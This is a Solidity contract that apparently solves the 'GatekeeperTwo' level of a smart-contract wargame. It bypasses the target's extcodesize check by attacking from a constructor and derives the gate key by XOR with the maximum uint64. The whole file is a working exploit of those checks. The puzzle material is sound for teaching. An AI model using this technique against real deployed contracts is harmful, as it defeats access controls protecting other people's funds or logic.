// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./_14_GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(address contractAddress) public {
        GatekeeperTwo gatekeeper = GatekeeperTwo(contractAddress);
        // attack is in constructor because contract is not yet created and extcodesize now will return 0
        //
        // Bitwise Operations
        // A xor B = C
        // A xor C = B
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
            (uint64(0) - 1);
        gatekeeper.enter(bytes8(gateKey));
    }
}
